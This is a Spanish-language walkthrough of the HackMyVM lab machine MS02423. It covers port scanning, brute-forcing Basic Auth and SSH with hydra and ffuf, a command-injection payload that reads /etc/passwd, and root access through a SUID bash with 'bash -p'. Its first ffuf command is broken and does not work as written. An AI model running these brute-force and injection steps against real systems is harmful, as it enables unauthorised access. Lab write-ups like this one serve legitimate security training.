# 🎯 MS02423 - HackMyVM

## 📋 Info

| Campo      | Detalle          |
|------------|------------------|
| Máquina    | MS02423          |
| Plataforma | HackMyVM         |
| Dificultad | Medium           |
| OS         | Linux Debian     |
| IP         | 192.168.0.21     |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- --min-rate 5000 -n -Pn 192.168.0.21
```

**Puertos abiertos:**
- 22/tcp → SSH
- 80/tcp → HTTP (Apache)
- 423/tcp → HTTP (Login web en chino — MS02423系统)

---

## 🌐 Enumeración

### Puerto 80 — robots.txt

La página principal muestra el default de Apache. El archivo `robots.txt` revela rutas:

```bash
curl http://192.168.0.21/robots.txt
```

Entradas encontradas:
- `/admin.txt`
- `/login.txt`
- `.config`
- `.backup`
- `.user.txt`
- `/wp-admin`

La mayoría devuelve 404, pero `.user.txt` contiene información codificada en HTML entities.

### Decodificación de .user.txt

```bash
curl http://192.168.0.21/.user.txt
```

Tras decodificar las HTML entities:

- **Usuarios:** `admin`, `john`, `alice`, `sysadmin`, `ctf_player`
- **Pista:** `<-----passwd top 500----->`

Indica que hay que atacar con las 500 contraseñas más comunes de rockyou.

### Puerto 423 — Login Web

Sistema de login en chino ("MS02423系统 - 登录"). Analizando el código fuente:

- Usa **HTTP Basic Authentication** (Base64)
- Las credenciales se envían en el header `Authorization: Basic <base64>`
- Login exitoso redirige a `.hint.php`

### Brute force Basic Auth con ffuf

```bash
head -500 /usr/share/wordlists/rockyou.txt > top500.txt

ffuf -u http://192.168.0.21:423/index.php \
  -w top500.txt \
  -H "Authorization: Basic $(echo -n 'ctf_player:FUZZ' | base64 | sed 's/FUZZ//' )" \
  -mc 200
```

> Alternativa directa con hydra:
```bash
hydra -l ctf_player -P top500.txt http-get://192.168.0.21:423/index.php
```

**Credenciales encontradas:** `ctf_player:<PASSWORD>`

### .hint.php

Tras autenticarnos accedemos a la pista:

```bash
curl -u ctf_player:<PASSWORD> http://192.168.0.21:423/.hint.php
```

Mensaje: *"恭喜你,你已经成功了一半，听说过wfuzz工具吗"*
(Traducción: "Felicidades, ya vas por la mitad. ¿Has oído hablar de wfuzz?")

Indica que hay que fuzzear más endpoints en el puerto 423.

### Enumeración adicional puerto 423

```bash
ffuf -u http://192.168.0.21:423/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -H "Authorization: Basic $(echo -n 'ctf_player:<PASSWORD>' | base64)" \
  -mc 200 -fs 0
```

Archivos encontrados:
- `index.php` — Login
- `info.php` — phpinfo()

Datos clave de `info.php`:
- **Document Root:** `/var/www/html_423`
- **file_uploads:** On
- **upload_max_filesize:** 2M

---

## 💥 Explotación

### Command Injection

A través de la aplicación web autenticada se puede inyectar comandos. Se lee `/etc/passwd`:

```bash
;cat /etc/passwd
```

Usuarios con shell identificados:

```
2002:x:1000:1000:2002 User:/home/2002:/bin/bash
MS02423:x:1001:1001:MS02423 User:/home/MS02423:/bin/bash
```

### Brute Force SSH

Con los usuarios descubiertos atacamos SSH:

```bash
echo -e "2002\nMS02423" > ssh_users.txt
hydra -L ssh_users.txt -P top500.txt ssh://192.168.0.21 -t 4 -f
```

**Credenciales válidas:** `2002:<PASSWORD>`

### Acceso SSH — User Flag

```bash
ssh 2002@192.168.0.21
cat user.txt
```

**User Flag:** `flag:{...}`

---

## ⬆️ Escalada de Privilegios

### Enumeración post-explotación

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh
```

El script permite leer archivos pero **bloquea la lectura de `/root/root.txt`** explícitamente.

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Resultado clave:** `/usr/bin/bash` tiene el bit **SUID** activado.

### bash SUID → root

```bash
bash -p
```

El flag `-p` (privileged) impide que bash restablezca los privilegios efectivos, manteniendo el UID de root gracias al SUID.

```bash
id
# uid=1000(2002) gid=1000(2002) euid=0(root)
cat /root/root.txt
```

**Root Flag:** `flag:{...}`

---

## 🗺️ Resumen del Ataque

```
arp-scan → host 192.168.0.21
    │
nmap -p- → puertos 22, 80, 423
    │
robots.txt → .user.txt → usuarios + pista "top 500"
    │
Brute force Basic Auth (puerto 423) → ctf_player:<PASSWORD>
    │
Command injection → /etc/passwd → usuarios: 2002, MS02423
    │
Hydra SSH (top500) → 2002:<PASSWORD>
    │
SSH → user.txt ✓
    │
bash SUID → bash -p → root → root.txt ✓
```

---

## 📚 Lecciones Aprendidas

1. **Escanea todos los puertos:** El puerto 423 es clave y no aparece en un escaneo de top-ports estándar. Siempre usa `-p-`.

2. **Lee el código fuente:** El login usaba Basic Auth personalizada en JavaScript, visible en el HTML. El navegador no siempre lo muestra claro.

3. **robots.txt puede revelar rutas ocultas:** Archivos como `.user.txt` con datos en HTML entities son pistas valiosas que se pasan por alto.

4. **SUID en bash = root inmediato:** `bash -p` con bit SUID da acceso root directo. Es una mala configuración crítica muy explotable.

5. **Las pistas en CTF son literales:** "top 500" significaba exactamente usar las 500 primeras contraseñas de rockyou, ni más ni menos.
